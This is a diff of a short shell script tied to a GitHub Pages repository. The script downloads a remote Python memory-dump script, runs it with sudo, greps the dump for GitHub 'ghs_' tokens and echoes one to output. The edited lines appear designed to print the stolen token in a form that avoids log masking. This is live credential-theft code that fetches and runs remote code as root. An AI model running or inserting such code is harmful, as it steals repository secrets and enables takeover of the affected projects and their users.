@@ -2,10 +2,9 @@
 set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' `
-NewT= "zzz"
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
 echo "-----------------------------------------------------------------"
-echo $NewT $TOKEN_VAL $NewT
+echo "1" "2$TOKEN_VAL"
 echo "-----------------------------------------------------------------"
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
 
